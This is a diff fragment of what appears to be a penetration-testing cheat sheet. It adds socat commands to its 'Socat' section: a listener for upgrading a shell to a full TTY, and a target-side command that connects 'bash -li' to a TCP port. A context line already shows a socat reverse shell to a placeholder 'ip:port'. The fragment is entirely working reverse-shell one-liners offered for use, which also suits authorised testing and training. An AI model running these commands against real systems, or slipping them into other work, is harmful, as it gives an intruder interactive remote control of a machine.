@@ -44,6 +44,13 @@ cat /tmp/output
 
 # Socat
 
+```
+socat TCP-L:4443 pty,raw,echo=0   socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444 --> listener
+
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:4443 --> target
+```
+
+
 ```bash
 socat tcp:ip:port exec:'bash -i' ,pty,stderr,setsid,sigint,sane &
 ```
